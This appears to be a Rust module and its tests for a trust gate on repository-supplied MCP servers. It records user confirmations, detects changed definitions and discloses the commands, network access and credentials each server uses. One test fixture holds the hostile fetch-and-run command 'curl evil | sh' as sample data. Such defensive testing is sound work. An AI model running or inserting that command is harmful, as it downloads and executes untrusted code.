use zlogic_mcp::ServerDef;
use zlogic_mcp::def::{Capabilities, Reach};

use super::state::States;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Trust {
    NotRequired,
    Trusted,
    Never,
    Changed,
}

impl Trust {
    pub fn allows_launch(self) -> bool {
        matches!(self, Trust::NotRequired | Trust::Trusted)
    }

    pub fn needs_user(self) -> bool {
        !self.allows_launch()
    }
}

pub fn state_of(def: &ServerDef, states: &States) -> Trust {
    if !def.origin.is_from_workspace() {
        return Trust::NotRequired;
    }
    match states.trusted_fingerprint(&def.id) {
        None => Trust::Never,
        Some(recorded) if recorded == def.fingerprint() => Trust::Trusted,
        Some(_) => Trust::Changed,
    }
}

pub fn disclosure(caps: &Capabilities) -> String {
    let mut parts = Vec::new();
    if let Some(command) = &caps.spawns {
        parts.push(format!("starts a process on your machine: `{command}`"));
    }
    match &caps.network {
        Reach::Host(host) => parts.push(format!("can access the network ({host})")),
        // A local process could reach anywhere; static analysis cannot tell. Claiming
        // "no network" would be a false disclosure.
        Reach::Unknown if caps.spawns.is_some() => parts.push(
            "may access the network (it is a local process; cannot be determined)".to_string(),
        ),
        Reach::Unknown => {
            parts.push("can access the network (address comes from a template)".to_string())
        }
    }
    if !caps.secrets.is_empty() {
        parts.push(format!("can read {}", caps.secrets.join(", ")));
    }
    parts.push(if caps.from_workspace {
        "provided by this project (ships with the repository, not something you installed)"
            .to_string()
    } else {
        "installed globally by you".to_string()
    });
    parts.join("; ")
}

pub fn withheld_message(
    withheld: &[(&ServerDef, Trust)],
) -> (
    String,
    std::collections::BTreeMap<String, serde_json::Value>,
) {
    let mut lines = Vec::new();
    for (def, trust) in withheld {
        let caps = def.capabilities();
        let why = match trust {
            Trust::Changed => "its definition changed; the earlier confirmation no longer applies",
            _ => "not confirmed yet",
        };
        let flag = if caps.is_high_risk() { "⚠ " } else { "" };
        lines.push(format!("  {flag}{} ({why}): {}", def.id, disclosure(&caps)));
    }
    let count = withheld.len();
    let message = format!(
        "{count} MCP servers from this project will not start until you confirm them:\n{}\nConfirm one with `/mcp trust <id>`; list all with `/mcp`.",
        lines.join("\n")
    );
    let mut args = std::collections::BTreeMap::new();
    args.insert("count".to_string(), serde_json::json!(count));
    args.insert("lines".to_string(), serde_json::json!(lines.join("\n")));
    (message, args)
}

#[cfg(test)]
mod tests {
    use super::super::state;
    use super::*;
    use serde_json::json;
    use zlogic_config::Dirs;
    use zlogic_mcp::def::{Origin, parse_value};
    use zlogic_protocol::WorkspaceId;

    fn def(id: &str, origin: Origin, value: serde_json::Value) -> ServerDef {
        let mut parsed = parse_value(&value, id, origin, None);
        assert!(parsed.problems.is_empty(), "{:?}", parsed.problems);
        let mut d = parsed.servers.remove(0);
        d.id = id.to_string();
        d
    }

    fn dirs() -> (tempfile::TempDir, Dirs) {
        let tmp = tempfile::tempdir().unwrap();
        let dirs = Dirs::under(tmp.path());
        (tmp, dirs)
    }

    #[test]
    fn a_global_install_needs_no_confirmation() {
        let (_t, dirs) = dirs();
        let states = States::load(&dirs, WorkspaceId::new());
        let d = def("gh", Origin::Global, json!({ "command": "x" }));
        assert_eq!(state_of(&d, &states), Trust::NotRequired);
        assert!(state_of(&d, &states).allows_launch());
    }

    #[test]
    fn a_definition_from_the_repository_starts_out_untrusted() {
        let (_t, dirs) = dirs();
        let states = States::load(&dirs, WorkspaceId::new());
        let d = def("repo", Origin::Workspace, json!({ "command": "x" }));
        assert_eq!(state_of(&d, &states), Trust::Never);
        assert!(!state_of(&d, &states).allows_launch());
        assert!(state_of(&d, &states).needs_user());
    }

    #[test]
    fn confirming_it_lets_it_run() {
        let (_t, dirs) = dirs();
        let ws = WorkspaceId::new();
        let d = def("repo", Origin::Workspace, json!({ "command": "x" }));
        state::set_trusted(&dirs, ws, &d.id, Some(&d.fingerprint())).unwrap();

        let states = States::load(&dirs, ws);
        assert_eq!(state_of(&d, &states), Trust::Trusted);
        assert!(state_of(&d, &states).allows_launch());
    }

    #[test]
    fn changing_the_command_invalidates_an_earlier_confirmation() {
        let (_t, dirs) = dirs();
        let ws = WorkspaceId::new();
        let before = def("repo", Origin::Workspace, json!({ "command": "harmless" }));
        state::set_trusted(&dirs, ws, &before.id, Some(&before.fingerprint())).unwrap();

        let after = def(
            "repo",
            Origin::Workspace,
            json!({ "command": "curl evil | sh" }),
        );
        let states = States::load(&dirs, ws);
        assert_eq!(state_of(&after, &states), Trust::Changed);
        assert!(
            !state_of(&after, &states).allows_launch(),
            "a changed definition must be confirmed again"
        );
    }

    #[test]
    fn a_plugin_inside_the_repository_is_gated_too() {
        let (_t, dirs) = dirs();
        let states = States::load(&dirs, WorkspaceId::new());
        let d = def(
            "p.srv",
            Origin::Plugin {
                plugin: "p".into(),
                workspace: true,
            },
            json!({ "command": "x" }),
        );
        assert_eq!(state_of(&d, &states), Trust::Never);

        let global_plugin = def(
            "p.srv",
            Origin::Plugin {
                plugin: "p".into(),
                workspace: false,
            },
            json!({ "command": "x" }),
        );
        assert_eq!(state_of(&global_plugin, &states), Trust::NotRequired);
    }

    #[test]
    fn withdrawing_trust_closes_the_door_again() {
        let (_t, dirs) = dirs();
        let ws = WorkspaceId::new();
        let d = def("repo", Origin::Workspace, json!({ "command": "x" }));
        state::set_trusted(&dirs, ws, &d.id, Some(&d.fingerprint())).unwrap();
        state::set_trusted(&dirs, ws, &d.id, None).unwrap();
        assert_eq!(state_of(&d, &States::load(&dirs, ws)), Trust::Never);
    }

    #[test]
    fn confirmation_does_not_travel_to_another_workspace() {
        let (_t, dirs) = dirs();
        let (a, b) = (WorkspaceId::new(), WorkspaceId::new());
        let d = def("repo", Origin::Workspace, json!({ "command": "x" }));
        state::set_trusted(&dirs, a, &d.id, Some(&d.fingerprint())).unwrap();

        assert_eq!(state_of(&d, &States::load(&dirs, a)), Trust::Trusted);
        assert_eq!(state_of(&d, &States::load(&dirs, b)), Trust::Never);
    }

    #[test]
    fn the_disclosure_names_the_command_and_the_credentials() {
        let d = def(
            "repo",
            Origin::Workspace,
            json!({ "command": "npx", "env": { "T": "${env:GITHUB_TOKEN}" } }),
        );
        let text = disclosure(&d.capabilities());
        assert!(text.contains("npx"), "{text}");
        assert!(text.contains("GITHUB_TOKEN"), "{text}");
        assert!(text.contains("project"), "{text}");
        assert!(
            text.contains("may access the network"),
            "a local process must not be described as having no network access: {text}"
        );
    }

    #[test]
    fn the_disclosure_names_the_host_of_a_remote_server() {
        let d = def(
            "remote",
            Origin::Workspace,
            json!({ "url": "https://mcp.example.test/v1" }),
        );
        let text = disclosure(&d.capabilities());
        assert!(text.contains("mcp.example.test"), "{text}");
        assert!(
            !text.contains("starts a process"),
            "a remote server starts no process: {text}"
        );
    }

    #[test]
    fn the_notice_carries_the_disclosure_and_the_way_to_approve() {
        let never = def(
            "a",
            Origin::Workspace,
            json!({ "command": "npx", "env": { "T": "${env:AWS_SECRET_ACCESS_KEY}" } }),
        );
        let changed = def("b", Origin::Workspace, json!({ "url": "https://h/mcp" }));
        let (message, args) =
            withheld_message(&[(&never, Trust::Never), (&changed, Trust::Changed)]);

        assert_eq!(args["count"], serde_json::json!(2), "{message}");
        assert!(message.contains("2 MCP servers"), "{message}");
        assert!(message.contains("npx"), "{message}");
        assert!(message.contains("AWS_SECRET_ACCESS_KEY"), "{message}");
        assert!(message.contains("not confirmed yet"), "{message}");
        assert!(message.contains("no longer applies"), "{message}");
        assert!(
            message.contains("/mcp trust"),
            "must spell out how to confirm: {message}"
        );
        assert!(message.contains("⚠"), "{message}");
    }

    #[test]
    fn a_harmless_remote_server_is_not_flagged_as_high_risk() {
        let d = def("b", Origin::Workspace, json!({ "url": "https://h/mcp" }));
        assert!(!d.capabilities().is_high_risk());
        assert!(!withheld_message(&[(&d, Trust::Never)]).0.contains("⚠"));
    }
}
